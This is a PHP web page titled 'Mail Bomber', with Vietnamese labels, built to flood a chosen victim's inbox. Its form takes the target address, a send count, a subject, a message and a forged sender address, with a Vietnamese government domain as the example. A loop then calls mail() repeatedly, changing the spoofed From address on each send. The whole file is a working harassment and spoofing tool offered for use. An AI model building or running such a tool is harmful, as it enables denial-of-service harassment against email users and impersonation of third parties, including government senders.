<html>
<head><title>Mail Bomber</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<body bgcolor="black">
<style type="text/css">
body,td,th {
    color: #00CC00;
}
</style></head>
<center><img src="http://www.vietsol.net/uploads/image/Email_Logo.gif" alt="picture" border="0" height="200" width="300"></center>
<?php if (!isset($_GET['action'])) { ?>
<div align=center>
<form action="?action=send" method="post">
Nạn nhân bị boom mail:<center><input type="text" name="email" /></br><br></center>
Số lần gửi:<center><input type="text" name="amount" /></br><br></center>
Tiêu đề:<center><input type="text" name="subject" /></br><br></center>
Email fake khi boom (vd:dat@chinhphu.vn):<center><input type="text" name="from" />@<input type="text" name="domain" /></br><br></center>
Nội dung:<center><input type="text" name="message" /></br><br></center>
Bắt đầu boom:<center><input type="submit" /></center>
<?php } elseif (isset($_GET['action']) && $_GET['action'] == 'send') { ?>
<div align=center><?php

$to = $_POST["email"];
$subject = $_POST["subject"]."Message: ";
$message = $_POST["message"]."Message: ";
$domain = $_POST["domain"];
$username = $_POST["from"];
$headers = "From: ";
$i=0;
$amount = $_POST["amount"];
do
  {
  mail($to,$subject.$i,$message.$i,$currMail);
  $i++;
  $currMail = $headers.$username.$i."@".$domain;
  echo "Đã gửi $i Emails đến $to .:D ngon<br />";
  }
while ($i<$amount);
}
?>
<br>
<br>
<center>Copyright 2012 - All rights reserved by Lil<br>
 This Site Best View Resolution of 1024 x 768 Or Higher.</center>
